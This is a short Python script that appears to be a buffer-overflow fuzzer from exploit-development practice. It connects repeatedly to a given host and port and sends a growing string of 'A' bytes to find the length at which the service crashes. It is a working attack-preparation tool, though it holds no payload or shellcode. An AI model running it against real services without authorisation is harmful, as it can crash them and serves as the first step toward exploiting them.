 #!/usr/bin/python3

# Author: AnubiSec
	
	
import socket
import sys
import time

if len(sys.argv) < 3:
	print("\nUsage: " + sys.argv[0] + " <HOST> <PORT>\n")
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]
length = 100 #inital length of bytes to send to binary



while (length < 10000): #continue to send data until bytes == 10000
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port))) #Connect to host
	s.recv(1024) #Grab banners (if any)
	s.send(b"A" * length) #Send payload
	s.recv(1024)
	s.close()
	time.sleep(2)
	print("Buffer sent: " + str(length))
	length += 100 #increment payload by 100
